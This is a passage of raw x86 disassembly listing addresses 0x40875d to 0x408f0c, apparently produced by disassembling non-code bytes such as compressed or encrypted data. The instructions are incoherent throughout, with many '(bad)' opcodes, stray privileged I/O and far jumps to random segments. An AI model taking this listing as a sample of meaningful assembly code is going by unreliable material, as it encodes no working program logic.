  40875d:	test   DWORD PTR [ebp-0x7bb4f27],0xd928733c
  408767:	mov    ds:0x3fd01898,eax
  40876c:	loope  0x408714
  40876e:	inc    esi
  40876f:	or     BYTE PTR [ebx+0x5b98d8fe],0xd3
  408776:	stos   BYTE PTR es:[edi],al
  408777:	mov    ds:0x2d60b880,al
  40877c:	mov    ebp,0x6b50b821
  408781:	cmc    
  408782:	push   0xe2856faa
  408787:	arpl   WORD PTR [ebx+0xc],si
  40878a:	pop    es
  40878b:	or     al,0x12
  40878d:	add    DWORD PTR [esi],eax
  40878f:	js     0x40872b
  408791:	push   cs
  408792:	xchg   esi,eax
  408793:	mov    ebx,0x6dbcabf9
  408798:	sbb    esi,eax
  40879a:	int3   
  40879b:	stos   BYTE PTR es:[edi],al
  40879c:	and    bl,0xcb
  40879f:	mov    edi,DWORD PTR [ecx+0x27c946b0]
  4087a5:	pop    es
  4087a6:	int    0x8b
  4087a8:	xchg   edi,eax
  4087a9:	pop    es
  4087aa:	test   eax,0xfe059fbd
  4087af:	and    edi,esp
  4087b1:	cld    
  4087b2:	dec    ebp
  4087b3:	enter  0xb2ff,0x3b
  4087b7:	aaa    
  4087b8:	mov    esi,0x6926a949
  4087bd:	add    BYTE PTR [edx+0x65],ch
  4087c0:	retf   
  4087c1:	push   ss
  4087c2:	ds (bad) 
  4087c4:	and    dh,bl
  4087c6:	xchg   esi,eax
  4087c7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4087c8:	and    al,0xd5
  4087ca:	pop    es
  4087cb:	sub    eax,0x87e275cc
  4087d0:	mov    dl,BYTE PTR [ebp-0x7ece9af3]
  4087d6:	fdivr  QWORD PTR [edx+0x51f466a1]
  4087dc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4087dd:	jle    0x4087e2
  4087df:	jo     0x4087f3
  4087e1:	cdq    
  4087e2:	pop    ebx
  4087e3:	or     BYTE PTR [ebp+0x613d785f],bl
  4087e9:	fmul   DWORD PTR [eax+0x6ffa1aec]
  4087ef:	dec    ebx
  4087f0:	(bad)  
  4087f1:	aas    
  4087f2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4087f3:	fidivr WORD PTR [ebx-0xc]
  4087f6:	xor    ah,BYTE PTR [eax+ebp*2]
  4087f9:	test   al,0x6c
  4087fb:	inc    ebp
  4087fc:	in     eax,0xfd
  4087fe:	ja     0x40879d
  408800:	mov    bl,0x30
  408802:	pop    es
  408803:	inc    eax
  408804:	out    dx,al
  408805:	pop    esp
  408806:	cmp    eax,0x2ce57b68
  40880b:	pop    ss
  40880c:	imul   edi,DWORD PTR [edi],0x7a334284
  408812:	inc    eax
  408813:	nop
  408814:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408815:	cwde   
  408816:	frstor [edx+0x6c]
  408819:	push   ebx
  40881a:	retf   0x5c46
  40881d:	fwait
  40881e:	or     al,0x24
  408820:	mov    ecx,0xe64ccc9c
  408825:	dec    BYTE PTR [ebp+0x7b]
  408828:	pop    esi
  408829:	ins    BYTE PTR es:[edi],dx
  40882a:	mov    cl,0xa5
  40882c:	out    dx,eax
  40882d:	push   edi
  40882e:	inc    ebx
  40882f:	dec    esp
  408830:	mov    edi,0xb0fc3a0b
  408835:	push   cs
  408836:	stos   BYTE PTR es:[edi],al
  408837:	push   ebx
  408838:	xchg   esp,eax
  408839:	sbb    al,0xc8
  40883b:	adc    DWORD PTR [eax+0x52],0x36e88f4
  408842:	data16 scas al,BYTE PTR es:[edi]
  408844:	sub    al,0xf9
  408846:	sub    esi,DWORD PTR ds:0xfef82ac9
  40884c:	cmp    BYTE PTR [ecx],al
  40884e:	inc    ecx
  40884f:	inc    esp
  408850:	fwait
  408851:	das    
  408852:	pop    edi
  408853:	xor    BYTE PTR [esi],ah
  408855:	pop    ebp
  408856:	(bad)  
  408857:	jns    0x4088a2
  408859:	stos   DWORD PTR es:[edi],eax
  40885a:	das    
  40885b:	bnd jmp 0x40882c
  40885e:	sub    al,al
  408860:	outs   dx,DWORD PTR ds:[esi]
  408861:	call   0x3670:0xe78ec322
  408868:	lods   al,BYTE PTR ds:[esi]
  408869:	hlt    
  40886a:	les    ebx,FWORD PTR [ecx+0x7c]
  40886d:	jno    0x40889e
  40886f:	out    0xdc,eax
  408871:	in     al,0xa9
  408873:	repz out 0x4f,eax
  408876:	stos   BYTE PTR es:[edi],al
  408877:	neg    eax
  408879:	ins    DWORD PTR es:[edi],dx
  40887a:	jl     0x40888d
  40887c:	sub    BYTE PTR [esi+0x2ae92896],0xee
  408883:	addr16 inc edx
  408885:	popf   
  408886:	push   0x62
  408888:	ds retf 0x53bf
  40888c:	push   es
  40888d:	push   edi
  40888e:	mov    ds,WORD PTR [edx]
  408890:	cmp    BYTE PTR [edx+0x54],ch
  408893:	xchg   edx,eax
  408894:	dec    ebx
  408895:	mov    ch,0x91
  408897:	scas   al,BYTE PTR es:[edi]
  408898:	(bad)  
  408899:	fst    DWORD PTR [ecx-0x27]
  40889c:	add    esp,0x24074f6e
  4088a2:	je     0x408903
  4088a4:	mov    ds:0x18f20ba7,al
  4088a9:	call   0xf2eaf02f
  4088ae:	inc    eax
  4088af:	retf   
  4088b0:	cmp    eax,esi
  4088b2:	push   ebp
  4088b3:	lock fdivrp st(0),st
  4088b6:	sub    al,0x94
  4088b8:	cmp    dl,BYTE PTR [eax]
  4088ba:	xchg   ebx,eax
  4088bb:	imul   ecx,DWORD PTR [ebx],0x7c248db9
  4088c1:	inc    esp
  4088c2:	sub    ecx,DWORD PTR [edi]
  4088c4:	sti    
  4088c5:	or     al,0x0
  4088c7:	mov    esp,0xb9fd4711
  4088cc:	pop    esi
  4088cd:	inc    bh
  4088cf:	mov    eax,0x905840b2
  4088d4:	ins    DWORD PTR es:[edi],dx
  4088d5:	adc    DWORD PTR [ebp-0x40838971],edx
  4088db:	or     al,0x49
  4088dd:	and    BYTE PTR [esi+0x7abb3d69],0xe2
  4088e4:	pop    ebp
  4088e5:	push   ss
  4088e6:	frstor [ebx+0x32]
  4088e9:	bound  ecx,QWORD PTR [edx+eiz*2+0x33b9742e]
  4088f0:	or     esi,DWORD PTR [edx+0x1e]
  4088f3:	inc    ecx
  4088f4:	and    edx,DWORD PTR [ebx+0x77]
  4088f7:	sub    BYTE PTR [edx+0xc3f9936],ch
  4088fd:	loop   0x408919
  4088ff:	jbe    0x40890c
  408901:	xor    bl,BYTE PTR [eax]
  408903:	sar    DWORD PTR [ebp+0x4417361c],cl
  408909:	dec    ecx
  40890a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40890b:	cmp    eax,0x8b7a87db
  408910:	shl    BYTE PTR [ebx-0x6370e91e],cl
  408916:	mov    al,ds:0xd93c230c
  40891b:	or     BYTE PTR ds:0x2151806e,cl
  408921:	mov    al,ds:0xf35aee73
  408926:	in     eax,dx
  408927:	and    ecx,ebp
  408929:	call   0x36bfcdc9
  40892e:	jecxz  0x408965
  408930:	xor    DWORD PTR [ebx+0x6764a891],edx
  408936:	sbb    eax,0x13d712c
  40893b:	and    DWORD PTR [esi],eax
  40893d:	sbb    eax,0xf3674ea
  408942:	pushf  
  408943:	retf   
  408944:	jmp    0x3110:0x2943104c
  40894b:	cdq    
  40894c:	sub    bl,cl
  40894e:	jno    0x408982
  408950:	dec    edx
  408951:	cmp    eax,0x30a7f7c1
  408956:	test   al,0xe0
  408958:	add    eax,0x2372c37f
  40895d:	sar    DWORD PTR ds:0xafe29aa6,0x5e
  408964:	jno    0x408913
  408966:	xchg   edx,eax
  408967:	cmp    ah,BYTE PTR [edx+ebp*1]
  40896a:	mov    esi,0xcb854f3f
  40896f:	pop    esp
  408970:	ror    ch,0x6d
  408973:	(bad)  
  408974:	je     0x4089be
  408976:	stc    
  408977:	iret   
  408978:	inc    edx
  408979:	ja     0x4089f1
  40897b:	retf   
  40897c:	aaa    
  40897d:	adc    ah,bl
  40897f:	loope  0x408968
  408981:	loop   0x4089b2
  408983:	ins    BYTE PTR es:[edi],dx
  408984:	or     BYTE PTR [eax-0x19],ah
  408987:	hlt    
  408988:	jle    0x40890b
  40898a:	daa    
  40898b:	mov    edi,0x4154fe40
  408990:	push   edx
  408991:	fdiv   st(4),st
  408993:	mov    cl,0x3f
  408995:	xlat   BYTE PTR ds:[ebx]
  408996:	shr    esi,cl
  408998:	mov    ebp,0x2460451f
  40899d:	sub    BYTE PTR [edi+edx*8],ch
  4089a0:	shl    DWORD PTR [ecx-0x6e],0x3
  4089a4:	in     al,0xd9
  4089a6:	sbb    DWORD PTR [ecx+esi*2],0xbedc4cf5
  4089ad:	aaa    
  4089ae:	leave  
  4089af:	mov    dh,0xf9
  4089b1:	cmp    BYTE PTR [ebx-0x61],bh
  4089b4:	aas    
  4089b5:	pusha  
  4089b6:	pop    edx
  4089b7:	lock mov esp,0xa8236859
  4089bd:	ins    BYTE PTR es:[edi],dx
  4089be:	sub    BYTE PTR [ebx-0xa],dh
  4089c1:	push   edi
  4089c2:	cld    
  4089c3:	pop    eax
  4089c4:	dec    ebp
  4089c5:	rcl    BYTE PTR [eax],0x13
  4089c8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4089c9:	and    cl,0x81
  4089cc:	pop    ebp
  4089cd:	or     al,0xc9
  4089cf:	add    al,0xad
  4089d1:	sahf   
  4089d2:	dec    eax
  4089d3:	sub    eax,0x7f865624
  4089d8:	into   
  4089d9:	mov    dh,BYTE PTR [ecx+0x3c]
  4089dc:	clc    
  4089dd:	std    
  4089de:	mov    bl,0x85
  4089e0:	sbb    al,BYTE PTR [ebx]
  4089e2:	fs push esi
  4089e4:	mov    edi,0xac1e0e72
  4089e9:	sbb    BYTE PTR [esi],bl
  4089eb:	ja     0x408a0e
  4089ed:	cmp    edx,edx
  4089ef:	sub    BYTE PTR [ebp+0x2b0e2043],0xbc
  4089f6:	sahf   
  4089f7:	inc    ebx
  4089f8:	pop    ds
  4089f9:	ror    DWORD PTR [ecx-0x7c837d9e],0x97
  408a00:	sbb    al,0x9a
  408a02:	ds sub al,0x1b
  408a05:	stos   DWORD PTR es:[edi],eax
  408a06:	and    DWORD PTR [esi+0x36],edi
  408a09:	idiv   al
  408a0b:	xchg   edx,eax
  408a0c:	push   eax
  408a0d:	sbb    bh,BYTE PTR [ebx]
  408a0f:	sub    edi,DWORD PTR ds:0x4d1ce848
  408a15:	cld    
  408a16:	ficomp WORD PTR [esi-0x3a]
  408a19:	les    esp,FWORD PTR [esi-0x46]
  408a1c:	ins    BYTE PTR es:[edi],dx
  408a1d:	cmc    
  408a1e:	jb     0x408a00
  408a20:	repnz push ebp
  408a22:	jb     0x4089f4
  408a24:	mov    WORD PTR [esi-0x4a],gs
  408a27:	sahf   
  408a28:	push   ecx
  408a29:	and    DWORD PTR [edx-0x26],ebx
  408a2c:	jnp    0x408a3d
  408a2e:	in     eax,dx
  408a2f:	push   cs
  408a30:	aad    0x51
  408a32:	adc    al,0x3d
  408a34:	sub    dh,dh
  408a36:	int    0xc1
  408a38:	rol    ebx,0xe5
  408a3b:	inc    eax
  408a3c:	and    al,0x19
  408a3e:	call   0x963a:0x56122601
  408a45:	inc    ecx
  408a46:	mov    eax,ds:0x5c9a5c6a
  408a4b:	adc    BYTE PTR [eax-0x188f2b28],ch
  408a51:	in     al,0x56
  408a53:	sbb    DWORD PTR [ebx-0x6ebf8378],esp
  408a59:	retf   0x8f30
  408a5c:	sub    BYTE PTR [ebx],cl
  408a5e:	jge    0x408a72
  408a60:	mov    ebx,0xa226357c
  408a65:	sbb    eax,0x53726790
  408a6a:	jnp    0x408a7d
  408a6c:	adc    eax,0x53d95933
  408a71:	in     eax,0x90
  408a73:	lea    esi,[edx+ebp*1]
  408a76:	add    al,0x21
  408a78:	and    eax,DWORD PTR [eax-0x1b87f46a]
  408a7e:	sti    
  408a7f:	(bad)  
  408a80:	hlt    
  408a81:	jo     0x408abe
  408a83:	xor    ebp,esi
  408a85:	fiadd  WORD PTR [esi]
  408a87:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408a88:	mov    ch,0x85
  408a8a:	mov    ebp,DWORD PTR [edx]
  408a8c:	rcr    DWORD PTR [ecx-0x33],1
  408a8f:	xor    esi,DWORD PTR ds:0x36b3965a
  408a95:	mov    BYTE PTR [esi+0x67dfc3a5],dl
  408a9b:	inc    esp
  408a9c:	stos   DWORD PTR es:[edi],eax
  408a9d:	aaa    
  408a9e:	sub    BYTE PTR [eax],al
  408aa0:	or     eax,0xdaed14ee
  408aa5:	mov    ecx,0x40c6d5c
  408aaa:	int    0xc
  408aac:	or     DWORD PTR [esi],0x9bd20083
  408ab2:	ret    0x641b
  408ab5:	sbb    eax,0x6fe64a9a
  408aba:	lods   eax,DWORD PTR ds:[esi]
  408abb:	mov    al,ds:0x5da264c8
  408ac0:	add    ebp,DWORD PTR [ebp-0x47]
  408ac3:	jl     0x408aa7
  408ac5:	mov    esi,0x17a80362
  408aca:	cdq    
  408acb:	test   DWORD PTR [esi+0x14],0xeec88a7e
  408ad2:	mov    ah,0x1e
  408ad4:	xor    DWORD PTR [esi+0x7c],eax
  408ad7:	rcl    DWORD PTR [ecx+0x146c4f30],cl
  408add:	dec    esp
  408ade:	push   edx
  408adf:	push   cs
  408ae0:	les    edi,FWORD PTR ds:0x7ae9d225
  408ae6:	jmp    0x408b13
  408ae8:	shl    cl,0xf5
  408aeb:	dec    edx
  408aec:	sub    DWORD PTR [edi],ecx
  408aee:	in     al,dx
  408aef:	push   eax
  408af0:	pushf  
  408af1:	ja     0x408a79
  408af3:	and    eax,0x961e706a
  408af8:	out    dx,eax
  408af9:	ins    BYTE PTR es:[edi],dx
  408afa:	ja     0x408aaf
  408afc:	adc    DWORD PTR [eax+0x27],eax
  408aff:	cmp    al,0x2
  408b01:	not    DWORD PTR [edx-0x3b]
  408b04:	inc    esi
  408b05:	adc    DWORD PTR [ebx+0x28],0x8e5f35a
  408b0c:	stos   DWORD PTR es:[edi],eax
  408b0d:	xor    al,0x31
  408b0f:	mov    ebx,cs
  408b11:	or     bl,al
  408b13:	cmp    bl,bh
  408b15:	cvtps2pd xmm0,QWORD PTR [eax-0x3]
  408b19:	push   ebp
  408b1a:	mov    ds:0x459fe74,al
  408b1f:	push   esp
  408b20:	bound  ecx,QWORD PTR [ebp+0x316447ad]
  408b26:	jl     0x408b89
  408b28:	push   0x7d
  408b2a:	shl    DWORD PTR [edi-0x4aa3eb86],cl
  408b30:	mov    ds:0xf6111274,al
  408b35:	(bad)  
  408b36:	out    dx,eax
  408b37:	dec    ecx
  408b38:	mov    db0,eax
  408b3b:	cmp    BYTE PTR [edi],bh
  408b3d:	inc    esp
  408b3e:	std    
  408b3f:	mov    cl,0x63
  408b41:	hlt    
  408b42:	loopne 0x408b9a
  408b44:	mov    BYTE PTR [ebp-0x31],0xb0
  408b48:	in     al,0x3
  408b4a:	scas   al,BYTE PTR es:[edi]
  408b4b:	dec    edi
  408b4c:	popf   
  408b4d:	call   0xb9aeb053
  408b52:	jae    0x408b07
  408b54:	shr    BYTE PTR [ebp+0x60],cl
  408b57:	mov    bh,0xef
  408b59:	daa    
  408b5a:	adc    BYTE PTR [edi+0x4a],al
  408b5d:	sub    bh,BYTE PTR [edi+edi*4+0x10]
  408b61:	sub    al,bh
  408b63:	cmp    edi,DWORD PTR [edi+0x44]
  408b66:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408b67:	inc    eax
  408b68:	test   al,0xed
  408b6a:	retf   0xef8f
  408b6d:	and    eax,0x63048873
  408b72:	pop    edi
  408b73:	enter  0x354b,0x92
  408b77:	and    edi,DWORD PTR [edi]
  408b79:	sbb    ebx,DWORD PTR [esi-0x1d]
  408b7c:	pop    edx
  408b7d:	data16 cld 
  408b7f:	shl    esp,cl
  408b81:	je     0x408bdc
  408b83:	inc    BYTE PTR [edi+0x3e0dc12a]
  408b89:	call   0x4a67aa05
  408b8e:	push   esp
  408b8f:	pop    ebp
  408b90:	add    edi,eax
  408b92:	sbb    eax,0x8448df21
  408b97:	std    
  408b98:	bound  esi,QWORD PTR [ebx+ebx*1+0x4f]
  408b9c:	gs and al,0x1
  408ba0:	mov    eax,ds:0xdd973ab
  408ba5:	test   al,0xd
  408ba7:	mov    ecx,0xe46806c2
  408bac:	aaa    
  408bad:	cwde   
  408bae:	jne    0x408be7
  408bb0:	mov    ds:0xdfbcb0f7,al
  408bb5:	jb     0x408b9f
  408bb7:	xor    DWORD PTR [ecx+eax*8-0x3665d95d],0xffffffd3
  408bbf:	std    
  408bc0:	mov    DWORD PTR [ebp-0x67793b2b],edx
  408bc6:	push   edx
  408bc7:	lds    ebx,FWORD PTR [ecx+0x63]
  408bca:	dec    esp
  408bcb:	fsubp  st(1),st
  408bcd:	xor    bl,BYTE PTR [ebx+0x41b3ec7b]
  408bd3:	shr    ecx,0x2d
  408bd6:	cmp    al,0x39
  408bd8:	fucomi st,st(7)
  408bda:	push   ds
  408bdb:	shr    dl,1
  408bdd:	xchg   BYTE PTR [eax+0x67],dh
  408be0:	retf   
  408be1:	sbb    BYTE PTR [edi+0x42560c27],dl
  408be7:	imul   esi,DWORD PTR ds:0x396c8b4b,0xfffffff2
  408bee:	or     BYTE PTR ds:0x9f53f63d,cl
  408bf4:	cmp    DWORD PTR ss:[ecx],ecx
  408bf7:	sbb    ebx,DWORD PTR [esi]
  408bf9:	lock xor WORD PTR [eax],ax
  408bfd:	inc    esp
  408bfe:	lods   al,BYTE PTR ds:[esi]
  408bff:	dec    esi
  408c00:	lock xchg edx,eax
  408c02:	cli    
  408c03:	test   al,0x45
  408c05:	mov    ebx,0xac284c8f
  408c0a:	mov    al,ds:0x2ad3bcd4
  408c0f:	adc    DWORD PTR [eax],edx
  408c11:	int    0xad
  408c13:	mov    ah,ch
  408c15:	bound  esi,QWORD PTR [ebp+ecx*4-0x4db11ca9]
  408c1c:	shl    DWORD PTR [edi+ebx*2],1
  408c1f:	loop   0x408c0d
  408c21:	pop    ds
  408c22:	and    DWORD PTR [ebx],eax
  408c24:	jno    0x408c50
  408c26:	adc    eax,0x4af92dfb
  408c2b:	and    cl,0x7d
  408c2e:	jge    0x408c97
  408c30:	xchg   edi,eax
  408c31:	inc    ebp
  408c32:	out    dx,eax
  408c33:	fstp   DWORD PTR [ebx+0x77d223a6]
  408c39:	adc    DWORD PTR [esi+0x35],eax
  408c3c:	enter  0xdd10,0xb6
  408c40:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408c41:	xchg   ecx,eax
  408c42:	xchg   BYTE PTR [ecx+ebx*2-0x6c],dl
  408c46:	adc    al,0x99
  408c48:	mov    edx,0xb70e4e52
  408c4d:	pop    eax
  408c4e:	add    eax,DWORD PTR [edi+0x76]
  408c51:	dec    ebp
  408c52:	push   esi
  408c53:	fnsave [edx]
  408c55:	(bad)  
  408c56:	mov    cl,0x14
  408c58:	dec    edi
  408c59:	ja     0x408c57
  408c5b:	stos   DWORD PTR es:[edi],eax
  408c5c:	xchg   edx,eax
  408c5d:	icebp  
  408c5e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408c5f:	stc    
  408c60:	push   es
  408c61:	push   esi
  408c62:	xor    DWORD PTR [eax+0x6d],ebx
  408c65:	pop    ebp
  408c66:	fcomp  QWORD PTR [eax+0x2f]
  408c6a:	pop    ebx
  408c6b:	arpl   WORD PTR ds:0xd1d3c7d0,si
  408c71:	aaa    
  408c72:	dec    eax
  408c73:	jle    0x408c76
  408c75:	jle    0x408c9b
  408c77:	push   ebp
  408c78:	hlt    
  408c79:	ins    DWORD PTR es:[edi],dx
  408c7a:	int3   
  408c7b:	imul   ecx,DWORD PTR [edi-0x21],0x44aa8faf
  408c82:	dec    edi
  408c83:	inc    edi
  408c84:	out    0x6b,al
  408c86:	push   0xe0119a07
  408c8b:	stos   DWORD PTR es:[edi],eax
  408c8c:	mov    al,0xf3
  408c8e:	int    0x10
  408c90:	sti    
  408c91:	(bad)  
  408c92:	jmp    0xc8290f48
  408c97:	cmp    al,0x17
  408c99:	add    bl,BYTE PTR [esi-0x4d]
  408c9c:	mov    edi,0xab0f4199
  408ca1:	add    eax,0xf54a67fe
  408ca6:	(bad)  
  408ca7:	push   ecx
  408ca8:	jecxz  0x408c76
  408caa:	aas    
  408cab:	bound  edi,QWORD PTR [ecx-0x7506455e]
  408cb1:	adc    DWORD PTR [ebp+0x7ef7e455],ebp
  408cb7:	push   ds
  408cb8:	daa    
  408cb9:	call   0x8e85a7b
  408cbe:	test   eax,0x5e21f85f
  408cc3:	or     DWORD PTR [eax+0x466f6c2f],esi
  408cc9:	mov    bh,bh
  408ccb:	out    dx,al
  408ccc:	dec    ebp
  408ccd:	push   0xee888332
  408cd2:	aad    0xe0
  408cd4:	loopne 0x408c91
  408cd6:	out    dx,eax
  408cd7:	push   edx
  408cd8:	add    BYTE PTR [ebp-0x42],dh
  408cdb:	xor    dh,dl
  408cdd:	hlt    
  408cde:	ret    0x16b1
  408ce1:	dec    DWORD PTR ds:0xea1780f2
  408ce7:	inc    esp
  408ce8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408ce9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408cea:	dec    esi
  408ceb:	aad    0x89
  408ced:	mov    bl,0x15
  408cef:	sub    BYTE PTR [edi-0x4f224e56],0xa2
  408cf6:	fsub   QWORD PTR [eax+0x3d]
  408cf9:	and    ah,BYTE PTR [ebp+0x4aee60e5]
  408cff:	cmp    cl,al
  408d01:	loope  0x408d5d
  408d03:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408d04:	add    edi,ebx
  408d06:	push   ebp
  408d07:	mov    esi,0x4ca4f9d7
  408d0c:	mov    eax,ds:0xfe120aa2
  408d11:	into   
  408d12:	cs nop
  408d14:	jns    0x408cf8
  408d16:	lods   eax,DWORD PTR ds:[esi]
  408d17:	xchg   esi,eax
  408d18:	or     ebx,ebp
  408d1a:	xor    esi,edi
  408d1c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408d1d:	add    DWORD PTR [ebp-0x9],edi
  408d20:	push   eax
  408d21:	and    DWORD PTR ds:0x8b36b0e1,esi
  408d27:	test   BYTE PTR [ebx+0x72],dh
  408d2a:	les    ebx,FWORD PTR [ebp+0x402582df]
  408d30:	nop
  408d31:	dec    esp
  408d32:	mov    esi,0x5c42fd42
  408d37:	std    
  408d38:	mov    dh,0x77
  408d3a:	add    bl,BYTE PTR [eax+0x6653c24b]
  408d40:	ja     0x408cf5
  408d42:	leave  
  408d43:	push   esi
  408d44:	push   esi
  408d45:	mov    edi,eax
  408d47:	arpl   WORD PTR [edx+ebp*4-0x22],bx
  408d4b:	push   esi
  408d4c:	cmp    al,BYTE PTR [esi+eiz*4-0x65]
  408d50:	sahf   
  408d51:	sub    DWORD PTR [eax],ebp
  408d53:	(bad)  
  408d55:	and    esi,esp
  408d57:	sbb    al,0x3b
  408d59:	push   DWORD PTR [eax-0x38]
  408d5c:	out    dx,eax
  408d5d:	dec    eax
  408d5e:	popa   
  408d5f:	jne    0x408dcd
  408d61:	lahf   
  408d62:	push   es
  408d63:	dec    edi
  408d64:	lods   eax,DWORD PTR ds:[esi]
  408d65:	inc    ecx
  408d66:	rol    esp,0x22
  408d69:	pushf  
  408d6a:	cmc    
  408d6b:	add    al,BYTE PTR [edi-0x4e]
  408d6e:	fdiv   DWORD PTR [esi+0x672d3015]
  408d74:	fcomp  QWORD PTR [edx-0x43114aa7]
  408d7a:	dec    edi
  408d7b:	not    BYTE PTR [ebx]
  408d7d:	retf   
  408d7e:	jbe    0x408d5c
  408d80:	jp     0x408de2
  408d82:	ins    BYTE PTR es:[edi],dx
  408d83:	retf   
  408d84:	xchg   esi,eax
  408d85:	fcom   DWORD PTR [edi]
  408d87:	push   ebx
  408d88:	add    eax,ecx
  408d8a:	or     ah,BYTE PTR [eax]
  408d8c:	xchg   ebx,eax
  408d8d:	pop    es
  408d8e:	jno    0x408d1d
  408d90:	std    
  408d91:	mov    DWORD PTR [ebp-0x4c],ebx
  408d94:	ins    DWORD PTR es:[edi],dx
  408d95:	push   ss
  408d96:	bound  edx,QWORD PTR [ebx-0x80]
  408d99:	fild   WORD PTR [ecx+0x59]
  408d9c:	inc    esi
  408d9d:	scas   eax,DWORD PTR es:[edi]
  408d9e:	inc    BYTE PTR [ebx-0x7007048]
  408da4:	std    
  408da5:	hlt    
  408da6:	jge    0x408d92
  408da8:	loopne 0x408dbe
  408daa:	mov    WORD PTR [edx],?
  408dac:	cwde   
  408dad:	call   0x8752:0xab09e81c
  408db4:	dec    esi
  408db5:	push   esp
  408db6:	mov    esp,0x25734192
  408dbb:	sar    DWORD PTR [ebp+0x20],1
  408dbe:	lahf   
  408dbf:	retf   0xef20
  408dc2:	push   eax
  408dc3:	ret    0xcdb6
  408dc6:	(bad)  
  408dc7:	pop    ecx
  408dc8:	jb     0x408e39
  408dca:	outs   dx,BYTE PTR ds:[esi]
  408dcb:	test   DWORD PTR [ebx+0x5aa1732e],ebp
  408dd1:	mov    eax,ds:0xe47d8721
  408dd6:	push   ss
  408dd7:	fst    QWORD PTR [ebx-0x4d]
  408dda:	mov    cl,0x7
  408ddc:	push   esp
  408ddd:	out    dx,eax
  408dde:	xor    bh,al
  408de0:	loope  0x408da7
  408de2:	push   edx
  408de3:	clc    
  408de4:	test   DWORD PTR [edx+0x1f],ebp
  408de7:	into   
  408de8:	cld    
  408de9:	add    eax,0x1ed2b998
  408dee:	add    ecx,ecx
  408df0:	loope  0x408e5e
  408df2:	jnp    0x408e2a
  408df4:	jmp    0x1d154f98
  408df9:	fsub   QWORD PTR [ecx]
  408dfb:	mov    edi,0xc1b4b4bd
  408e00:	push   0x284792c3
  408e05:	or     DWORD PTR [ebx+0x2],edi
  408e08:	cmp    eax,0x5ddf3e7f
  408e0d:	dec    edx
  408e0e:	cmp    al,0xec
  408e10:	inc    ebp
  408e11:	imul   ecx,DWORD PTR [edx-0x8351060],0x9bea006f
  408e1b:	aad    0x1e
  408e1d:	push   0xe3b30d20
  408e22:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408e23:	lahf   
  408e24:	ud1    ebx,DWORD PTR [ecx-0x656ebf97]
  408e2b:	loop   0x408deb
  408e2d:	mov    al,ds:0x4266525d
  408e32:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408e33:	push   ds
  408e34:	out    0xd6,eax
  408e36:	xor    BYTE PTR [esi],bh
  408e38:	add    DWORD PTR [ebp+0x325c49b8],0xfffffff8
  408e3f:	pusha  
  408e40:	inc    ecx
  408e41:	or     eax,0x7554120
  408e46:	dec    edi
  408e47:	imul   edx,ebp,0xbfe94bc7
  408e4d:	int    0xe6
  408e4f:	mov    ds:0x90707598,eax
  408e54:	mov    bh,dl
  408e56:	adc    al,0xa
  408e58:	xchg   ebp,eax
  408e59:	mov    ebx,0xe868979
  408e5e:	push   ds
  408e5f:	xchg   ecx,eax
  408e60:	jecxz  0x408e08
  408e62:	xor    al,0xa6
  408e64:	pop    esi
  408e65:	cmp    eax,0x3cee3fbf
  408e6a:	sub    al,bh
  408e6c:	sub    dh,BYTE PTR [esi+eiz*1+0x48]
  408e70:	jle    0x408e15
  408e72:	xor    ah,BYTE PTR [ecx-0x4a36f32]
  408e78:	out    0x3e,al
  408e7a:	xor    edi,DWORD PTR [ebx]
  408e7c:	sbb    DWORD PTR [edi+0x73702784],eax
  408e82:	inc    ecx
  408e83:	(bad)  
  408e85:	jnp    0x408e53
  408e87:	sar    al,1
  408e89:	inc    esp
  408e8a:	out    dx,al
  408e8b:	shl    edx,0x6d
  408e8e:	mov    bl,0x35
  408e90:	mov    eax,0x868909b4
  408e95:	push   ds
  408e96:	fldcw  WORD PTR [edx-0x1e]
  408e99:	lahf   
  408e9a:	gs xor esp,esi
  408e9d:	pop    es
  408e9e:	out    0x5f,al
  408ea0:	sbb    al,0x51
  408ea2:	(bad)  
  408ea3:	retf   
  408ea4:	call   0xdbd4:0xc2f0d12
  408eab:	xchg   ebp,eax
  408eac:	add    al,0xe6
  408eae:	aaa    
  408eaf:	fbld   TBYTE PTR [edi+0x32e1f6a4]
  408eb5:	mov    eax,0x7c7a0cf1
  408eba:	jbe    0x408ecd
  408ebc:	lock sbb al,0x25
  408ebf:	sub    ecx,0x2d
  408ec2:	jbe    0x408e70
  408ec4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408ec5:	push   ecx
  408ec6:	lea    eax,ds:0x5609a62
  408ecc:	jb     0x408ef2
  408ece:	fwait
  408ecf:	jne    0x408eb3
  408ed1:	jno    0x408e9c
  408ed3:	ja     0x408e84
  408ed5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408ed6:	inc    ecx
  408ed7:	sub    BYTE PTR [eax+0x447db24a],cl
  408edd:	mov    ecx,0xfc76d25a
  408ee2:	(bad)  
  408ee3:	inc    edi
  408ee4:	(bad)  
  408ee5:	jmp    0x408ed1
  408ee7:	dec    ecx
  408ee8:	dec    ebx
  408ee9:	mov    eax,0x34270f59
  408eee:	cwde   
  408eef:	imul   esi,DWORD PTR [edx],0x4d
  408ef2:	push   ebp
  408ef3:	int    0xef
  408ef5:	sbb    eax,0xdb688cc5
  408efa:	lahf   
  408efb:	pusha  
  408efc:	ret    0xe0ff
  408eff:	(bad)  
  408f01:	inc    ecx
  408f02:	dec    esi
  408f03:	xchg   edx,eax
  408f04:	pop    esi
  408f05:	dec    ecx
  408f06:	js     0x408ec9
  408f08:	pushf  
  408f09:	das    
  408f0a:	mov    ebp,DWORD PTR [ebx]
  408f0c:	mov    ecx,cs
